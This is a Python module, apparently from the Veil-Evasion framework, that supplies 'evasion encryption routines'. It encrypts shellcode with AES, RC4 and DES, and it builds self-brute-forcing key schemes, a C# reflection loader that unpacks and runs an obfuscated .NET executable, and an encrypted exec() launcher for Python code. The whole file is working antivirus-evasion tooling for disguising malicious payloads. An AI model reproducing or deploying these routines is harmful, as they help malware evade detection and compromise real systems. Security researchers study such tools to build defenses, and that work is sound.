"""
Evasion Encryption Routines
"""

import base64
import random
import string
from Crypto.Cipher import ARC4
from Crypto.Cipher import AES
from Crypto.Cipher import DES
from lib.common import helpers
from tools.evasion.evasion_common import evasion_helpers


def aes_encryption(incoming_shellcode, encryption_pad=4):
    # Generate a random key, create the cipher object
    # pad the shellcode, and encrypt the padded shellcode
    # return encrypted -> encoded shellcode and key
    random_aes_key = helpers.randomKey()
    iv = helpers.randomString(16)
    aes_cipher_object = AES.new(random_aes_key.encode('utf8'), AES.MODE_CBC, iv.encode('utf8'))
    padded_shellcode = encryption_padding(incoming_shellcode, encryption_pad)
    encrypted_shellcode = aes_cipher_object.encrypt(padded_shellcode)
    encoded_ciphertext = base64.b64encode(encrypted_shellcode)
    return encoded_ciphertext, random_aes_key, iv


def arc_encryption(incoming_shellcode):
    # Generate a random key, create the cipher object
    # pad the shellcode, and encrypt the padded shellcode
    # return encrypted -> encoded shellcode and key
    random_arc_key = helpers.randomKey()
    arc_cipher_object = ARC4.new(random_arc_key)
    padded_shellcode = encryption_padding(incoming_shellcode)
    encrypted_shellcode = arc_cipher_object.encrypt(padded_shellcode)
    encoded_ciphertext = base64.b64encode(encrypted_shellcode)
    return encoded_ciphertext, random_arc_key


def arya(source):

    # compile the source to a temporary .EXE path
    tempExePath = evasion_helpers.compileToTemp("cs", source)

    try:
        # read in the raw binary
        with open(tempExePath, 'rb') as f:
            rawBytes = f.read()

        # build the obfuscated launcher source and return it
        launcherCode = buildAryaLauncher(rawBytes)

        return launcherCode

    except:
        print(helpers.color(" [!] Couldn't read compiled .NET source file: " + tempExePath, warning=True))
        return ""


def b64sub(s, key):
    """
    "Encryption" method that base64 encodes a given string,
    then does a randomized alphabetic letter substitution.
    """
    enc_tbl = str.maketrans(string.ascii_letters, key)
    return str.translate(base64.b64encode(s).decode('ascii'), enc_tbl)


def buildAryaLauncher(raw):
    """
    Takes a raw set of bytes and builds a launcher shell to b64decode/decrypt
    a string rep of the bytes, and then use reflection to invoke
    the original .exe
    """

    # the 'key' is a randomized alpha lookup table [a-zA-Z] used for substitution
    key = ''.join(sorted(list(string.ascii_letters), key=lambda *args: random.random()))
    base64payload = b64sub(raw, key)

    payload_code = "using System; using System.Collections.Generic; using System.Text;"
    payload_code += "using System.IO; using System.Reflection; using System.Linq;\n"

    decodeFuncName = evasion_helpers.randomString()
    baseStringName = evasion_helpers.randomString()
    targetStringName = evasion_helpers.randomString()
    dictionaryName = evasion_helpers.randomString()

    # build out the letter sub decrypt function
    payload_code += "namespace %s { class %s { private static string %s(string t, string k) {\n" % (evasion_helpers.randomString(), evasion_helpers.randomString(), decodeFuncName)
    payload_code += "string %s = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n" % (baseStringName)
    payload_code += "string %s = \"\"; Dictionary<char, char> %s = new Dictionary<char, char>();\n" % (targetStringName, dictionaryName)
    payload_code += "for (int i = 0; i < %s.Length; ++i){ %s.Add(k[i], %s[i]); }\n" % (baseStringName, dictionaryName,baseStringName)
    payload_code += "for (int i = 0; i < t.Length; ++i){ if ((t[i] >= 'A' && t[i] <= 'Z') || (t[i] >= 'a' && t[i] <= 'z')) { %s += %s[t[i]];}\n" % (targetStringName, dictionaryName)
    payload_code += "else { %s += t[i]; }} return %s; }\n" % (targetStringName, targetStringName)

    base64PayloadName = evasion_helpers.randomString()
    assemblyName = evasion_helpers.randomString()

    # build out Main()
    assemblyName = evasion_helpers.randomString()
    methodInfoName = evasion_helpers.randomString()
    keyName = evasion_helpers.randomString()
    payload_code += "static void Main() {\n"
    payload_code += "string %s = \"%s\";\n" % (base64PayloadName, base64payload)
    payload_code += "string %s = \"%s\";\n" % (keyName, key)
    # load up the assembly of the decoded binary
    payload_code += "Assembly %s = Assembly.Load(Convert.FromBase64String(%s(%s, %s)));\n" % (assemblyName, decodeFuncName, base64PayloadName, keyName)
    payload_code += "MethodInfo %s = %s.EntryPoint;\n" % (methodInfoName, assemblyName)
    # use reflection to jump to its entry point
    payload_code += "%s.Invoke(%s.CreateInstance(%s.Name), null);\n" % (methodInfoName, assemblyName, methodInfoName)
    payload_code += "}}}\n"

    return payload_code


def constrained_aes(incoming_shellcode):
    """
    Generates a constrained AES key which is later brute forced
    in a loop
    """
    # Create our constrained Key
    small_key = helpers.randomKey(25)

    # Actual Key used
    real_key = small_key + str(helpers.randomNumbers())

    # Create Cipher Object with Generated Secret Key
    aes_cipher_object = AES.new(real_key, AES.MODE_ECB)

    # Prep for manipulation (this is really for python stallion only)
    # If this function as a whole is needed for another language
    # It should probably be rewritten without this step
    incoming_shellcode = incoming_shellcode.encode('latin-1')
    incoming_shellcode = incoming_shellcode.decode('unicode_escape')

    # Pad the shellcode
    padded_shellcode = encryption_padding(incoming_shellcode, '*')

    # actually encrypt the shellcode
    encrypted_shellcode = aes_cipher_object.encrypt(padded_shellcode)

    # Base64 encode the encrypted shellcode
    encoded_ciphertext = base64.b64encode(encrypted_shellcode)

    # return a tuple of (encodedText, small constrained key, actual key used)
    return encoded_ciphertext, small_key, real_key


def des_encryption(incoming_shellcode):
    # Generate a random key, create the cipher object
    # pad the shellcode, and encrypt the padded shellcode
    # return encrypted -> encoded shellcode and key
    random_des_key = helpers.randomKey(8)
    iv = helpers.randomString(8)
    des_cipher_object = DES.new(random_des_key, DES.MODE_CBC, iv)
    padded_shellcode = encryption_padding(incoming_shellcode)
    encrypted_shellcode = des_cipher_object.encrypt(padded_shellcode)
    encoded_ciphertext = base64.b64encode(encrypted_shellcode)
    return encoded_ciphertext, random_des_key, iv


def encryption_padding(sc_to_pad, padding_letter=4):
    if padding_letter == 4:
        padding_letter = random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?")
    sc_to_pad = bytes(sc_to_pad, 'latin-1')
    while len(sc_to_pad) % 16 != 0:
        sc_to_pad += padding_letter.encode('latin-1')
    return sc_to_pad


def known_plaintext(known_key, random_plaintext):
    """
    Uses key passed in to encrypt a random string which is
    used in a known plaintext attack to brute force its
    own key
    """
    aes_cipher_object = AES.new(known_key, AES.MODE_ECB)
    random_plaintext = encryption_padding(random_plaintext, '*')
    encrypted_text = aes_cipher_object.encrypt(random_plaintext)
    encoded_ciphertext = base64.b64encode(encrypted_text)

    # return our encrypted known plaintext
    return encoded_ciphertext


def pyherion(code):
    """
    Generates a crypted hyperion'esque version of python code using
    base64 and AES with a random key, wrapped in an exec() dynamic launcher.

    code = the python source code to encrypt

    Returns the encrypted python code as a string.
    """

    imports = list()
    codebase = list()

    # strip out all imports from the code so pyinstaller can properly
    # launch the code by preimporting everything at compiletime
    for line in code.split("\n"):
        if not line.startswith("#"): # ignore commented imports...
            if "import" in line:
                imports.append(line.strip('\t'))
            else:
                codebase.append(line)

    # encrypt the input file (less the imports)
    encrypted_code, key, iv = aes_encryption("\n".join(codebase), encryption_pad='{')
    encrypted_code = encrypted_code.decode('ascii')

    # some random variable names
    b64var = helpers.randomString()
    aesvar = helpers.randomString()

    # randomize our base64 and AES importing variable
    imports.append("from base64 import b64decode as " + b64var)
    imports.append("from Crypto.Cipher import AES as " + aesvar)

    # shuffle up our imports
    random.shuffle(imports)

    # add in the AES imports and any imports found in the file
    crypted = ";".join(imports) + "\n"

    # the exec() launcher for our base64'ed encrypted string
    to_be_encoded = "exec(" + aesvar + ".new(\"" + key + "\", " + aesvar + ".MODE_CBC, \"" + iv + "\").decrypt(" + b64var + "(\"" + encrypted_code + "\")).rstrip(b'{'))\n"
    to_be_encoded = to_be_encoded.encode()
    encoded_script = base64.b64encode(to_be_encoded).decode('ascii')
    crypted += "exec(" + b64var + "(\"" + encoded_script + "\"))"

    return crypted
